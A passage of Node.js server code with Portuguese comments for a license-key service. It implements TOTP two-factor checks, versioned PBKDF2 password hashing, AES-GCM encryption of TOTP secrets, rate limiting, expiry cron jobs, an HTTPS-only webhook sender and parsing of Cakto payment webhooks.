    const idx = alpha.indexOf(c);
    if (idx < 0) throw new Error('invalid_base32');
    val = (val << 5) | idx;
    bits += 5;
    if (bits >= 8) { bits -= 8; out.push((val >> bits) & 0xff); }
  }
  return Buffer.from(out);
}

function base32Encode(buf) {
  const alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
  let bits = 0, val = 0, out = '';
  for (const byte of buf) { val = (val << 8) | byte; bits += 8; while (bits >= 5) { bits -= 5; out += alpha[(val >> bits) & 31]; } }
  if (bits > 0) out += alpha[(val << (5 - bits)) & 31];
  return out;
}
function genTotpSecret() { return base32Encode(crypto.randomBytes(20)); }

function generateTOTP(secret, window = 0) {
  const key   = base32Decode(secret);
  const epoch = Math.floor(Date.now() / 1000);
  const step  = Math.floor(epoch / 30) + window;
  const buf   = Buffer.alloc(8);
  buf.writeUInt32BE(Math.floor(step / 0x100000000), 0);
  buf.writeUInt32BE(step >>> 0, 4);
  const hmac  = crypto.createHmac('sha1', key).update(buf).digest();
  const off   = hmac[hmac.length - 1] & 0xf;
  return ((hmac.readUInt32BE(off) & 0x7fffffff) % 1000000).toString().padStart(6, '0');
}

// Assinatura original preservada (pass, salt) — chamadores legados continuam
// rodando com 150000 iterações exatamente como antes. O
// 3º parâmetro é aditivo: só quem passa explicitamente um valor sai do
// comportamento legado.
function hashPassword(pass, salt, iterations = 150000) {
  return new Promise((res, rej) =>
    crypto.pbkdf2(String(pass).slice(0,128), String(salt), iterations, 64, 'sha256',
      (e, d) => e ? rej(e) : res(d.toString('hex')))
  );
}
function genSalt() { return crypto.randomBytes(32).toString('hex'); }

// ── Portal standalone: work factor de senha versionado ──────────────────
// Contas antigas (sem passwordIterations no registro) foram hasheadas com
// 150000 iterações — comparar contra elas com 600000 nunca bateria e
// derrubaria todo login legado. PASSWORD_ITERATIONS_LEGACY documenta esse
// valor histórico; PASSWORD_ITERATIONS_CURRENT é o novo padrão (cadastro,
// troca de senha, reset e rehash transparente pós-login legado).
const PASSWORD_ITERATIONS_LEGACY  = 150000;
const PASSWORD_ITERATIONS_CURRENT = 600000;

// Compara a senha informada contra o hash salvo, usando as iterações do
// PRÓPRIO registro do usuário (fallback pro valor legado se o campo ainda
// não existir — contas criadas antes desta rodada). Comparação final via
// timingSafeEqual, como já era.
async function verifyPortalPassword(pass, user) {
  const iterations = user.passwordIterations || PASSWORD_ITERATIONS_LEGACY;
  const hash = await hashPassword(pass, user.salt, iterations);
  const _a = Buffer.from(hash, 'hex'), _b = Buffer.from(user.passwordHash || '', 'hex');
  return _a.length === _b.length && _a.length > 0 && crypto.timingSafeEqual(_a, _b);
}

// Gera um novo hash já no formato atual (600000 iterações) — usado por
// cadastro, troca de senha, reset de senha e rehash transparente.
async function hashNewPortalPassword(pass) {
  const salt = genSalt();
  const passwordHash = await hashPassword(pass, salt, PASSWORD_ITERATIONS_CURRENT);
  return {
    passwordHash, salt,
    passwordKdf: 'pbkdf2-sha256',
    passwordIterations: PASSWORD_ITERATIONS_CURRENT,
    passwordVersion: 2,
  };
}

// Se o registro ainda está no formato legado (sem passwordIterations, ou
// abaixo do valor atual), rehasheia em segundo plano após um login válido.
// Fire-and-forget deliberado: se a escrita falhar, o próximo login legado
// tenta de novo — nunca bloqueia nem falha o login em andamento.
// Retorna a Promise (o chamador de login NÃO dá await nela — dispara e segue
// pra resposta HTTP) só pra ficar testável; em produção seu resultado nunca
// é aguardado nem afeta o fluxo de login em andamento.
function maybeRehashPortalPassword(db, email, pass, user) {
  if (user.passwordIterations >= PASSWORD_ITERATIONS_CURRENT) return Promise.resolve();
  return hashNewPortalPassword(pass)
    .then(upgraded => db.collection('portal_users').updateOne({ _id: email }, { $set: upgraded }))
    .catch(e => console.warn('[Portal] rehash pós-login falhou (não bloqueia o login):', e.message));
}

// Comparação de segredos em tempo constante. Aceita strings de qualquer tamanho:
// o comprimento sozinho já vaza por timing em `===`, então normalizamos via hash
// SHA-256 antes de comparar (buffers sempre de 32 bytes → timingSafeEqual nunca lança).
function safeCompare(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  if (!a.length || !b.length) return false;
  const ha = crypto.createHash('sha256').update(a, 'utf8').digest();
  const hb = crypto.createHash('sha256').update(b, 'utf8').digest();
  return crypto.timingSafeEqual(ha, hb);
}

function verifyTOTP(secret, token) {
  if (!secret) return true;
  if (!token || token.length !== 6) return false;
  for (const w of [-2, -1, 0, 1, 2]) {  // drift window ampliado
    if (generateTOTP(secret, w) === token) return true;
  }
  return false;
}


function _portalTotpDecodeKey(raw) {
  const value = String(raw || '').trim();
  if (!value) return null;
  if (/^[a-f0-9]{64}$/i.test(value)) return Buffer.from(value, 'hex');
  try {
    const decoded = Buffer.from(value, 'base64');
    if (decoded.length === 32 && decoded.toString('base64').replace(/=+$/,'') === value.replace(/=+$/,'')) return decoded;
  } catch (_) {}
  return null;
}

function portalTotpDedicatedKeyValid() {
  return !!_portalTotpDecodeKey(PORTAL_TOTP_ENCRYPTION_KEY);
}

function portalTotpCryptoMode() {
  if (portalTotpDedicatedKeyValid()) return 'DEDICATED';
  if (Buffer.byteLength(String(APP_SECRET || ''), 'utf8') >= 32) return 'FALLBACK';
  return 'UNAVAILABLE';
}

function portalTotpKeyRing() {
  const candidates = [];
  const currentExplicit = _portalTotpDecodeKey(PORTAL_TOTP_ENCRYPTION_KEY);
  if (currentExplicit) candidates.push({ source: 'explicit', key: currentExplicit });
  for (const raw of String(PORTAL_TOTP_ENCRYPTION_KEY_PREVIOUS || '').split(',').map(v => v.trim()).filter(Boolean)) {
    const key = _portalTotpDecodeKey(raw);
    if (key) candidates.push({ source: 'previous', key });
  }
  // Compatibilidade segura de transição: se ainda não houver chave dedicada,
  // usa uma chave derivada e domain-separated do APP_SECRET já obrigatório.
  // Mesmo depois que a chave dedicada for configurada, a derivada continua no
  // ring para decifrar registros criados antes da rotação.
  if (Buffer.byteLength(String(APP_SECRET || ''), 'utf8') >= 32) {
    candidates.push({ source: 'app-secret', key: crypto.createHash('sha256').update('zvm:portal:totp:v1\0' + APP_SECRET, 'utf8').digest() });
  }
  const out = [], seen = new Set();
  for (const item of candidates) {
    const kid = crypto.createHash('sha256').update(Buffer.concat([Buffer.from('zvm:portal:totp:kid\0'), item.key])).digest('hex').slice(0, 16);
    if (seen.has(kid)) continue;
    seen.add(kid); out.push({ ...item, kid });
  }
  return out;
}

function _portalTotpAad(email) {
  return `zvm:portal:totp:${String(email || '').toLowerCase().trim()}`;
}

function portalTotpEncrypt(secret, email) {
  const current = portalTotpKeyRing()[0];
  if (!current?.key) throw Object.assign(new Error('portal_totp_crypto_unavailable'), { code: 'PORTAL_TOTP_CRYPTO_UNAVAILABLE' });
  const value = String(secret || '').trim();
  if (!/^[A-Z2-7]{16,128}$/i.test(value)) throw Object.assign(new Error('portal_totp_secret_invalid'), { code: 'PORTAL_TOTP_SECRET_INVALID' });
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', current.key, iv);
  cipher.setAAD(Buffer.from(_portalTotpAad(email), 'utf8'));
  const data = Buffer.concat([cipher.update(value, 'utf8'), cipher.final()]);
  return { v: 1, alg: 'A256GCM', kid: current.kid, iv: iv.toString('base64'), tag: cipher.getAuthTag().toString('base64'), data: data.toString('base64') };
}

function portalTotpDecrypt(box, email) {
  if (!box || box.v !== 1 || box.alg !== 'A256GCM' || !/^[a-f0-9]{16}$/.test(String(box.kid || ''))) throw Object.assign(new Error('portal_totp_secret_invalid'), { code: 'PORTAL_TOTP_SECRET_INVALID' });
  const iv = Buffer.from(String(box.iv || ''), 'base64');
  const tag = Buffer.from(String(box.tag || ''), 'base64');
  const data = Buffer.from(String(box.data || ''), 'base64');
  if (iv.length !== 12 || tag.length !== 16 || data.length < 1 || data.length > 256) throw Object.assign(new Error('portal_totp_secret_invalid'), { code: 'PORTAL_TOTP_SECRET_INVALID' });
  const item = portalTotpKeyRing().find(x => x.kid === box.kid);
  if (!item) throw Object.assign(new Error('portal_totp_key_unavailable'), { code: 'PORTAL_TOTP_KEY_UNAVAILABLE' });
  try {
    const decipher = crypto.createDecipheriv('aes-256-gcm', item.key, iv);
    decipher.setAAD(Buffer.from(_portalTotpAad(email), 'utf8'));
    decipher.setAuthTag(tag);
    const secret = Buffer.concat([decipher.update(data), decipher.final()]).toString('utf8');
    if (!/^[A-Z2-7]{16,128}$/i.test(secret)) throw new Error('shape');
    return secret;
  } catch (_) {
    throw Object.assign(new Error('portal_totp_secret_invalid'), { code: 'PORTAL_TOTP_SECRET_INVALID' });
  }
}

function preparePortalUserForEmailChange(user, oldEmail, newEmail) {
  if (!user || typeof user !== 'object') throw Object.assign(new Error('portal_user_invalid'), { code: 'PORTAL_USER_INVALID' });
  const sourceEmail = String(oldEmail || '').toLowerCase().trim();
  const targetEmail = String(newEmail || '').toLowerCase().trim();
  if (!sourceEmail || !targetEmail) throw Object.assign(new Error('portal_email_invalid'), { code: 'PORTAL_EMAIL_INVALID' });
  const next = { ...user, _id: targetEmail, email: targetEmail };
  delete next.emailChangeOp;
  delete next.emailChangeTarget;
  delete next.emailChangeStartedAt;
  if (user.totpSecretEnc) {
    const activeSecret = portalTotpDecrypt(user.totpSecretEnc, sourceEmail);
    next.totpSecret = PORTAL_TOTP_ENCRYPTED_SENTINEL;
    next.totpSecretEnc = portalTotpEncrypt(activeSecret, targetEmail);
  }
  if (user.pendingTotpSecretEnc) {
    const pendingSecret = portalTotpDecrypt(user.pendingTotpSecretEnc, sourceEmail);
    next.pendingTotpSecretEnc = portalTotpEncrypt(pendingSecret, targetEmail);
  }
  return next;
}

function portalTotpHasSecret(user) {
  return !!(user && (user.totpSecretEnc || user.totpSecret));
}

function portalTotpActiveFields(secret, email) {
  return {
    totpSecret: PORTAL_TOTP_ENCRYPTED_SENTINEL,
    totpSecretEnc: portalTotpEncrypt(secret, email),
  };
}

function portalTotpReadSecret(user, email) {
  if (!user) return '';
  if (user.totpSecretEnc) return portalTotpDecrypt(user.totpSecretEnc, email || user._id || user.email || '');
  const legacy = typeof user.totpSecret === 'string' ? user.totpSecret.trim() : '';
  if (legacy === PORTAL_TOTP_ENCRYPTED_SENTINEL) {
    throw Object.assign(new Error('portal_totp_ciphertext_missing'), { code: 'PORTAL_TOTP_CIPHERTEXT_MISSING' });
  }
  return legacy;
}

function portalTotpReadPendingSecret(user, email) {
  if (!user) return '';
  if (user.pendingTotpSecretEnc) return portalTotpDecrypt(user.pendingTotpSecretEnc, email || user._id || user.email || '');
  return typeof user.pendingTotpSecret === 'string' ? user.pendingTotpSecret.trim() : '';
}

async function migratePortalTotpLegacy(db, user, email, opts = {}) {
  if (!db || !user) return user;
  if (opts.force !== true && !PORTAL_TOTP_MIGRATE_LEGACY) return user;
  const id = String(email || user._id || user.email || '').toLowerCase().trim();
  if (!id) return user;
  const set = {}, unset = {};
  if (user.totpSecret && !user.totpSecretEnc && user.totpSecret !== PORTAL_TOTP_ENCRYPTED_SENTINEL) {
    Object.assign(set, portalTotpActiveFields(user.totpSecret, id));
  }
  if (user.pendingTotpSecret && !user.pendingTotpSecretEnc) {
    set.pendingTotpSecretEnc = portalTotpEncrypt(user.pendingTotpSecret, id);
    unset.pendingTotpSecret = '';
  }
  if (!Object.keys(set).length) return user;
  await db.collection('portal_users').updateOne({ _id: id }, { $set: set, $unset: unset });
  return { ...user, ...set, pendingTotpSecret: undefined };
}

// Regra de login do Analytics: senha sempre obrigatória; TOTP só é exigido
// quando expectedTotpSecret (ANALYTICS_TOTP_SECRET) está preenchida —
// verifyTOTP() já retorna true sozinha nesse caso, então esta função nunca
// precisa de um "if" separado pra manter compatibilidade quando a variável
// está vazia. Recebe expectedPass/expectedTotpSecret por parâmetro (em vez
// de ler ANALYTICS_PASS/ANALYTICS_TOTP_SECRET direto) só pra ficar testável
// com qualquer combinação, sem depender de como o processo foi iniciado.
function checkAnalyticsLogin(pass, totpCode, expectedPass, expectedTotpSecret) {
  // safeCompare já hasheia os dois lados antes do timingSafeEqual — evita
  // por completo a comparação de comprimento em claro que o ramo anterior
  // fazia (mesmo com fallback pra Buffer.alloc(1), ainda era um branch
  // condicionado ao tamanho). Mesmo comportamento pros casos de borda:
  // string vazia dos dois lados (ANALYTICS_PASS ausente) continua false.
  const passOk = safeCompare(String(pass || ''), String(expectedPass || ''));
  const totpOk = verifyTOTP(expectedTotpSecret, String(totpCode || '').trim());
  return passOk && totpOk;
}

function deriveSlug(seed) {
  if (!APP_SECRET) return null;
  return crypto.createHmac('sha256', APP_SECRET).update(seed).digest('hex').slice(0, 14);
}
const R_ADMIN     = (s => s ? '/' + s : '/admin')    (deriveSlug('admin-panel'));
const R_ANALYTICS = (s => s ? '/' + s : '/analytics')(deriveSlug('analytics-panel'));
const R_EXT       = '/extension';
const INTERNAL_AUDIT_TOKEN = crypto.randomBytes(24).toString('hex');
function isInternalAuditProbe(req) {
  const remote = String(req?.socket?.remoteAddress || '').replace(/^::ffff:/, '');
  const loopback = remote === '127.0.0.1' || remote === '::1';
  const token = String(req?.headers?.['x-zvm-internal-audit'] || '');
  return loopback && token.length === INTERNAL_AUDIT_TOKEN.length && safeCompare(token, INTERNAL_AUDIT_TOKEN);
}

const rateLimitMap  = new Map();
const _DEDUP_TTL_MS = 60 * 60 * 1000; // TTL para entradas de dedup de logs (1h)
const RL_CONFIG = {
  login:          { max: 5,  windowMs: 60000, blockMs: 10 * 60000 },
  api:            { max: 30, windowMs: 60000, blockMs:  2 * 60000 },
  // Extension key authentication used to share one `ext_key` bucket across
  // legacy auth, V4 sessions and V3 activation. A busy/blocked legacy path
  // could therefore reject the very first legitimate V3 activation from the
  // same public IP. Keep the same anti-bruteforce strength, but isolate each
  // authentication surface so unrelated traffic cannot poison another path.
  ext_key_legacy: { max: 20, windowMs: 60000, blockMs:  5 * 60000 },
  ext_key_v4:     { max: 60, windowMs: 60000, blockMs:       60000 },
  ext_key_v3:     { max: 60, windowMs: 60000, blockMs:       60000 },
  check_status:   { max: 180, windowMs: 60000, blockMs: 20000 },
  // Legacy usage polling is read-heavy and must not exhaust the modern API bucket.
  legacy_v3_usage:{ max: 180, windowMs: 60000, blockMs: 20000 },
  checkkey:     { max: 10, windowMs: 60000, blockMs:  5 * 60000 },
  reset:        { max: 3,  windowMs: 300000, blockMs: 30 * 60000 },
  twofa:        { max: 5,  windowMs: 60000,  blockMs: 10 * 60000 },
  cakto:        { max: 30, windowMs: 60000,  blockMs:  5 * 60000 },
  // Cada operação tem um orçamento independente. Antes, cinco PRÉVIAS de
  // limpeza já bloqueavam a EXECUÇÃO por dez minutos.
  analytics_lab_preview:       { max: 80, windowMs: 60000, blockMs: 15000 },
  analytics_lab_simulate:      { max: 20, windowMs: 60000, blockMs: 60000 },
  analytics_lab_email_preview: { max: 80, windowMs: 60000, blockMs: 15000 },
  analytics_lab_email_send:    { max: 8,  windowMs: 60000, blockMs: 5 * 60000 },
  analytics_purge_preview:     { max: 80, windowMs: 60000, blockMs: 15000 },
  analytics_purge_execute:     { max: 5,  windowMs: 60000, blockMs: 10 * 60000 },
  dev_sign:      { max: 20, windowMs: 60000, blockMs: 10 * 60000 },
};

function checkRateLimit(ip, type = 'api', maxReq = 0, windowMs = 0) {
  const now = Date.now();
  const key = ip + ':' + type;
  const cfg = maxReq > 0 ? { max: maxReq, windowMs: windowMs || 60000, blockMs: 2*60000 } : (RL_CONFIG[type] || RL_CONFIG.api);
  let e = rateLimitMap.get(key);
  if (!e) {
    e = { count: 0, resetAt: now + cfg.windowMs, blockedUntil: 0};
    rateLimitMap.set(key, e);
  }
  if (now < e.blockedUntil) return false;
  // Um bloqueio temporário cumprido deve iniciar uma janela limpa;
  // antes, um bloqueio de 15s era reativado indefinidamente até fechar
  // a janela antiga de 60s, apesar do Retry-After anunciado.
  if ((e.blockedUntil > 0 && now >= e.blockedUntil) || now > e.resetAt) {
    e.count = 0; e.resetAt = now + cfg.windowMs; e.blockedUntil = 0;
  }
  e.count++;
  if (e.count > cfg.max) {
    e.blockedUntil = now + cfg.blockMs;
    console.warn(`[RATE-LIMIT] ${type} — IP bloqueado: ${ip}`);
    // Telemetria: só grava na primeira vez que o bloco é aplicado (count===max+1)
    if (e.count === cfg.max + 1) {
      addSecurityAlert('RATE_LIMIT', `Limite excedido — tipo="${type}" após ${cfg.max} req/min`, ip);
    }
    return false;
  }
  return true;
}

function getRateLimitWait(ip, type = 'login') {
  const e = rateLimitMap.get(ip + ':' + type);
  if (!e || Date.now() >= e.blockedUntil) return 0;
  return Math.ceil((e.blockedUntil - Date.now()) / 60000);
}

function getRateLimitRetryAfterSeconds(ip, type = 'api') {
  const e = rateLimitMap.get(ip + ':' + type);
  if (!e || Date.now() >= e.blockedUntil) return 0;
  return Math.max(1, Math.ceil((e.blockedUntil - Date.now()) / 1000));
}
function sendExtensionRateLimited(res, ip, type, body) {
  const retryAfter = getRateLimitRetryAfterSeconds(ip, type);
  if (retryAfter > 0) res.setHeader('Retry-After', String(retryAfter));
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  sendJson(res, { ...body, retryAfterSeconds: retryAfter || undefined }, 429);
}
function sendAnalyticsRateLimited(res, ip, type) {
  const retryAfter = getRateLimitRetryAfterSeconds(ip, type);
  if (retryAfter > 0) res.setHeader('Retry-After', String(retryAfter));
  sendJson(res, { error: 'rate_limited', retryAfterSeconds: retryAfter || 1 }, 429);
}

if (!ZVM_LOCAL_SAFE_MODE) {
  setInterval(() => {
    const now = Date.now();
    for (const [k, e] of rateLimitMap.entries())
      if (now > e.blockedUntil && now > e.resetAt) rateLimitMap.delete(k);
    for (const [k, ts] of _dedupMap.entries())
      if (now - ts > _DEDUP_TTL_MS) _dedupMap.delete(k);
    // Limpar falhas de chave com mais de 1h
    for (const [k, f] of keyFailMap.entries())
      if (now - f.firstAt > 3600000) keyFailMap.delete(k);
    // Persistir blocos ativos no MongoDB
    persistRateBlocks().catch(() => {});
  }, 30 * 60 * 1000).unref();
}

setInterval(() => {
  const now = Date.now();
  for (const [k, s] of Object.entries(sessions))
    if (now > new Date(s.expiresAt).getTime()) delete sessions[k];
  for (const [k, s] of Object.entries(portalSessions))
    if (now > new Date(s.expiresAt).getTime()) delete portalSessions[k];
  for (const [k, s] of Object.entries(analyticsSessions))
    if (now > new Date(s.expiresAt).getTime()) delete analyticsSessions[k];
}, 60 * 60 * 1000).unref(); // 1h — sessões duram horas, limpeza não precisa ser frequente

if (!ZVM_LOCAL_SAFE_MODE) {
  // Cron: marca chaves expiradas + envia aviso de "expirando em breve" a cada hora
  setInterval(async () => {
    const now = Date.now();
    let expired = 0;
    for (const [code, k] of Object.entries(keys)) {
      // Marcar expiradas
      if (k.active && k.expiresAt && new Date(k.expiresAt).getTime() < now) {
        keys[code].active = false;
        saveKey(code).catch(() => {});
        fireWebhook('key_expired', code, 'Cron de expiração');
        expired++;
        continue;
      }
      // Aviso de expiração em breve (uma única vez por ciclo)
      if (k.active && k.expiresAt && !k.warnEmailSent && RESEND_API_KEY) {
        const msLeft = new Date(k.expiresAt).getTime() - now;
        if (msLeft > 0 && msLeft <= EXPIRY_WARN_HOURS * 3600000) {
          try {
            const _db = await getMongoDb();
            const _pu = await _db.collection('portal_users').findOne({ keyCode: code });
            if (_pu && _pu._id) {
              const hoursLeft = Math.ceil(msLeft / 3600000);
              // warnEmailSent só é marcado com o retorno REAL do envio — antes era
              // marcado incondicionalmente, então uma recusa do Resend (ou qualquer
              // falha) perdia a tentativa pra sempre nesse ciclo de expiração (o
              // cliente nunca mais recebia o aviso, mesmo com o provedor de volta
              // no ar). Falhando, o próximo ciclo horário tenta de novo — sem risco
              // de loop de spam, porque um sucesso interrompe as tentativas.
              const warnSent = await sendKeyExpiryWarningEmail(_pu._id, {
                code, hoursLeft, planLabel: displayLicensePlan({planId:k.planId,planLabel:k.planName,maxUses:k.maxUses}).label, maxUses: k.maxUses,
                expiresAt: k.expiresAt, baseUrl: BASE_URL, ctaPath: '/cliente',
              });
              if (warnSent) {
                keys[code].warnEmailSent = true;
                saveKey(code).catch(() => {});
              } else {
                console.warn('[CRON] Aviso de expiração não confirmado pelo provedor — tenta de novo no próximo ciclo:', maskLicenseCode(code));
              }
            }
          } catch (e) { console.warn('[CRON] Aviso expiração:', e.message); }
        }
      }
    }
    if (expired > 0) { invalidateKeysHtmlCache(); console.log(`[CRON] ${expired} chave(s) expirada(s).`); }
  }, 60 * 60 * 1000).unref();
}

function parseSafeWebhookUrl(raw) {
  try {
    const url = new URL(String(raw || '').trim());
    if (url.protocol !== 'https:' || !url.hostname || url.username || url.password) return null;
    return url;
  } catch (_) { return null; }
}

function fireWebhook(event, keyCode, reason) {
  if (!WEBHOOK_URL) return;
  const url = parseSafeWebhookUrl(WEBHOOK_URL);
  if (!url) { console.warn('[WEBHOOK] URL recusada — somente HTTPS sem credenciais embutidas é permitido'); return; }
  const k = keys[keyCode];
  const payload = {
    event,
    keyCode:   maskLicenseCode(keyCode),
    label:     safeScalar(k?.label || '-', 60),
    phone:     maskPhone(k?.lastPhone || ''),
    reason:    safeScalar(reason, 120, '-'),
    timestamp: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
  };
  try {
    const data = JSON.stringify(payload);
    const req  = https.request({
      hostname: url.hostname,
      port:     url.port || 443,
      path:     url.pathname + url.search,
      method:   'POST',
      headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
      timeout:  8000,
    });
    req.on('error', e => console.warn('[WEBHOOK] Erro:', e.message));
    req.on('timeout', () => { req.destroy(); console.warn('[WEBHOOK] Timeout'); });
    req.write(data); req.end();
  } catch (e) { console.warn('[WEBHOOK] Falha:', e.message); }
}

// Extrai dados de origem/rastreamento de um payload de webhook ou API, se existirem
// (utm_source/utm_medium/utm_campaign, src, referrer). Não depende de nenhum campo
// específico — plataformas diferentes usam nomes diferentes, então tenta várias.
function extractTracking(payload) {
  if (!payload || typeof payload !== 'object') return null;
  const t = payload.tracking || payload.utm || {};
  const src  = payload.utm_source   || t.utm_source   || payload.src    || payload.source || '';
  const med  = payload.utm_medium   || t.utm_medium   || '';
  const camp = payload.utm_campaign || t.utm_campaign || '';
  const ref  = payload.referrer || payload.referer || payload.ref || '';
  const out = {};
  if (src)         out.src      = String(src).slice(0, 40);
  if (med)         out.medium   = String(med).slice(0, 40);
  if (camp)        out.campaign = String(camp).slice(0, 40);
  if (ref && !src) out.ref      = String(ref).slice(0, 60);
  if (!Object.keys(out).length) return null;
  out.compact = [
    out.src      ? 'origem:'  +out.src      : null,
    out.medium   ? 'meio:'    +out.medium   : null,
    out.campaign ? 'campanha:'+out.campaign : null,
    out.ref      ? 'ref:'     +out.ref      : null,
  ].filter(Boolean).join(' · ');
  return out;
}

function getKeyTracking(k) {
  if (k.tracking && typeof k.tracking === 'object') return k.tracking;
  const m = (k.note || '').match(/Origem: (.+)/);
  if (!m) return null;
  const out = {};
  for (const part of m[1].split(' · ')) {
    const [key, ...rest] = part.split(':');
    const val = rest.join(':');
    if (!val) continue;
    if (key === 'origem') out.src = val;
    else if (key === 'meio') out.medium = val;
    else if (key === 'campanha') out.campaign = val;
    else if (key === 'ref') out.ref = val;
  }
  return Object.keys(out).length ? out : null;
}
function renderTrackingChips(k) {
  const t = getKeyTracking(k);
  if (!t) return `<span style="color:var(--tx3)">—</span>`;
  return `<div class="trk">${t.src?`<span class="trk-chip trk-src">🎯 ${escHtml(t.src)}</span>`:''}${t.medium?`<span class="trk-chip trk-med">📡 ${escHtml(t.medium)}</span>`:''}${t.campaign?`<span class="trk-chip trk-camp">📣 ${escHtml(t.campaign)}</span>`:''}${(!t.src&&t.ref)?`<span class="trk-chip trk-ref">🔗 ${escHtml(t.ref)}</span>`:''}</div>`;
}

function isPlainRecord(value) {
  return !!value && typeof value === 'object' && !Array.isArray(value);
}

function safeScalar(value, maxLength, fallback = '') {
  if (value === null || value === undefined || typeof value === 'object') return fallback;
  return String(value).trim().slice(0, maxLength);
}

function normalizePlanName(value) {
  return safeScalar(value, 120)
    .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, ' ')
    .trim()
    .replace(/\s+/g, ' ');
}

// Canoniza uma checkoutUrl da Cakto pra comparação: origin + pathname (sem
// barra final), IGNORANDO query string e hash. Achado real do dry_run: a
// Cakto manda a URL de checkout com parâmetros de UTM anexados
// (?utm_source=...&utm_medium=...), e a versão antiga desta função só
// removia a barra final — a mesma checkout oficial com UTM nunca casava
// com ZVM_PLANS. Comparar origin+pathname (não só pathname) evita aceitar
// host arbitrário como se fosse checkout Cakto válido: a igualdade final em
// resolveCaktoPlan ainda é contra os 4 checkoutUrls reais em ZVM_PLANS, um
// host diferente simplesmente não bate.
function normalizeCheckoutUrl(value) {
  const raw = safeScalar(value, 300);
  if (!raw) return '';
  try {
    const u = new URL(raw);
    const pathname = u.pathname.replace(/\/$/, '') || '/';
    return `${u.origin}${pathname}`;
  } catch {
    // Não é uma URL absoluta (ex.: string relativa/vazia/malformada) —
    // mantém o comportamento anterior como fallback seguro.
    return raw.replace(/\/$/, '');
  }
}

function normalizeCaktoPurchase(payload) {
  if (!isPlainRecord(payload) || !isPlainRecord(payload.data)) return null;
  const data = payload.data;
  const customer = isPlainRecord(data.customer) ? data.customer : {};
  const product = isPlainRecord(data.product) ? data.product : {};
  const offer = isPlainRecord(data.offer) ? data.offer : {};
  const numberOrNull = (value) => {
    if (value === null || value === undefined || value === '') return null;
    const n = Number(value);
    return Number.isFinite(n) ? n : null;
  };

  return {
    source: 'cakto',
    event: safeScalar(payload.event, 80).toLowerCase(),
    status: safeScalar(data.status, 40).toLowerCase(),
    txId: safeScalar(data.id, 120),
    refId: safeScalar(data.refId, 120),
    clientName: safeScalar(customer.name, 120, 'Cliente'),
    clientEmail: safeScalar(customer.email, 160).toLowerCase(),
    clientPhone: safeScalar(customer.phone, 40),
    productId: safeScalar(product.id, 120),
    productShortId: safeScalar(product.short_id, 120),
    productName: safeScalar(product.name, 200),
    offerId: safeScalar(offer.id, 120),
    offerName: safeScalar(offer.name, 200),
    offerType: safeScalar(data.offer_type, 40).toLowerCase(),
    parentOrder: safeScalar(data.parent_order, 120),
    subscriptionId: safeScalar(isPlainRecord(data.subscription) ? data.subscription.id : (data.subscriptionId || data.subscription), 128),
    checkoutBinding: safeScalar(data.sck || data.metadata?.sck || data.tracking?.sck || data.utm?.sck || payload.sck || payload.metadata?.sck, 640),
    checkoutUrl: normalizeCheckoutUrl(data.checkoutUrl),
    amount: numberOrNull(data.amount),
    baseAmount: numberOrNull(data.baseAmount),
    offerPrice: numberOrNull(offer.price),
    discount: numberOrNull(data.discount),
    currency: safeScalar(offer.currency, 12).toUpperCase(),
    amountRawType: typeof data.amount,
    paymentMethod: safeScalar(data.paymentMethod, 60, '-'),
    paidAt: safeScalar(data.paidAt, 80),
    couponCode: safeScalar(data.couponCode, 80),
    tracking: extractTracking(data) || extractTracking(payload),
  };
}

function normalizeCaktoPurchases(payload) {
  if (!isPlainRecord(payload)) return [];
  const rows = Array.isArray(payload.data) ? payload.data : [payload.data];
  if (!rows.length || rows.length > 64) return [];
  const out = [];
  for (const data of rows) {
    if (!isPlainRecord(data)) return [];
    const purchase = normalizeCaktoPurchase({ ...payload, data });
    if (!purchase) return [];
    out.push(purchase);
  }
  return out;
}

function isCaktoPaidEntitlementEvent(event) {
  const value = safeScalar(event, 80).toLowerCase();
  return value === 'purchase_approved' || value === 'subscription_renewed';
}

function selectCaktoCommercialPurchase(purchases, plans = ZVM_PAYMENT_PLANS) {
  if (!Array.isArray(purchases) || !purchases.length) return { ok: false, status: 400, error: 'invalid_payload' };
  const event = safeScalar(purchases[0]?.event, 80).toLowerCase();
  if (!isCaktoPaidEntitlementEvent(event)) {
    return { ok: true, purchase: purchases[0], plan: resolveCaktoPlan(purchases[0], plans), webhookV2: purchases.length > 1 };
  }
  // Webhook V2 pode agrupar pedido principal + order bump/upsell/downsell.
  // A licença ZVM nasce somente do pedido principal; acessórios não devem
  // criar/renovar licença nem bloquear um main válido.
  const mains = purchases.filter(p => !p.offerType || p.offerType === 'main');
  if (!mains.length) return { ok: false, status: 422, error: 'main_order_missing' };
  const mapped = mains.map(purchase => ({ purchase, plan: resolveCaktoPlan(purchase, plans) })).filter(x => !!x.plan);
  if (!mapped.length) return { ok: false, status: 422, error: 'unmapped_plan' };
  // Mais de um main configurado no mesmo envelope é comercialmente ambíguo:
  // não somamos duração nem escolhemos arbitrariamente. Exige revisão/reenvio.
  if (mapped.length !== 1) return { ok: false, status: 422, error: 'ambiguous_multi_plan' };
  return { ok: true, ...mapped[0], webhookV2: purchases.length > 1, ignoredItems: purchases.length - 1 };
}

function resolveCaktoPlan(purchase, plans = ZVM_PAYMENT_PLANS) {
  if (!purchase || typeof purchase !== 'object') return null;
  const allPlans = Object.values(plans);
  const byConfiguredId = (field, configField) => {
    const received = safeScalar(purchase[field], 120);
    if (!received) return null;
    return allPlans.find(plan => plan[configField] && safeCompare(received, plan[configField])) || null;
  };

  const byOffer = byConfiguredId('offerId', 'offerId');
  if (byOffer) return byOffer;
  const byProduct = byConfiguredId('productId', 'productId');
  if (byProduct) return byProduct;

  const checkoutUrl = normalizeCheckoutUrl(purchase.checkoutUrl);
  if (checkoutUrl) {
    const byCheckout = allPlans.find(plan => normalizeCheckoutUrl(plan.checkoutUrl) === checkoutUrl);
    if (byCheckout) return byCheckout;
  }

  // Compatibilidade com a configuração Cakto já em produção: quando IDs não
  // estão pinados no ambiente, aceita SOMENTE igualdade exata após normalização
  // conservadora de acentos/pontuação. Não há regex, substring ou palavra-chave.
  // O webhook já passou HMAC+secret antes desta resolução e a camada comercial
